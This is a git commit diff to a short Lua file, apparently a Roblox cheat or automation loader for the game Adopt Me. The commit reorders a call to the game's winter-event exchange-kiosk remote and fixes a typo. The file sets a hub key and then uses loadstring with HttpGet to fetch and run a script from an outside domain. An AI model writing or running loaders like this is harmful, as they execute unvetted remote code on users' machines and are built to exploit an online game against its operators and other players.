ecd0fa3bf9a9c94647abfc143dcf4eb3ba6ce56d
greg66n <darien95sm@hotmail.com>
2024-12-29 19:04:53 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,5 +1,6 @@
+wait(5)
+game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/UseExchangeKiosk"):InvokeServer()
+wait(1)
 getgenv().hub_key = "4d964454191739793dcfa2a29ed7193a"
 getgenv().custom_label = "VPS1"
 loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_FROSTCLAW_2024.lua"))()
-wait(5)
-ame:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/UseExchangeKiosk"):InvokeServer()
